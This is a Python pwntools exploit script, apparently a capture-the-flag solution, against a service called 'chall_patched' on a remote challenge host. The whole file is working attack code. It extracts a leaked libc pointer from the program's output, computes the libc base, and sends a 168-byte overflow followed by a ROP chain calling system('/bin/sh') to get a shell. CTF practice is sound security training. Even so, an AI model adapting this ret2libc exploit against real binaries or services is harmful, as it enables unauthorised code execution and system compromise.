#!/usr/bin/env python3
from pwn import *
import re

exe   = ELF("./chall_patched")
libc  = ELF("./libc-2.27.so")
ld    = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.ehax.tech", 4269)
    return r

def main():
    r = conn()
    
    # Receive until the prompt.
    data = r.recvuntil("Enter authcode: ")
    log.info("Received data:\n" + data.decode())
    
    # Find all hexadecimal strings.
    matches = re.findall(rb"0x[0-9a-f]+", data)
    leak = None
    # Look for a pointer that starts with "0x7" (not the junk that starts with "0x44")
    for m in matches:
        if m.startswith(b"0x7"):
            leak = int(m, 16)
            break
    if leak is None:
        log.failure("Leak not found!")
        return
    
    log.info("Extracted leaked __wctrans pointer: " + hex(leak))
    
    # Adjust the leak if it ends with an extra 0.
    # For example, if leak is 0x7c0d9f6b45e00, adjust it to 0x7c0d9f6b45e0.
    if leak % 0x10 == 0:
        adjusted_leak = leak // 0x10
    else:
        adjusted_leak = leak
    log.info("Adjusted leaked __wctrans pointer: " + hex(adjusted_leak))
    
    # Calculate libc base using the offset of __wctrans from libc.
    wctrans_offset = libc.sym["__wctrans"]
    libc.address = adjusted_leak - wctrans_offset
    log.info("Calculated libc base: " + hex(libc.address))
    
    # Build the ROP chain.
    offset     = 168  # adjust if needed
    pop_rdi    = p64(0x0000000000400973)
    bin_sh     = p64(next(libc.search(b"/bin/sh")))
    ret_gadget = p64(0x000000000040061e)  # sometimes needed for alignment
    system     = p64(libc.sym["system"])
    
    payload = b"A" * offset + pop_rdi + bin_sh + ret_gadget + system
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
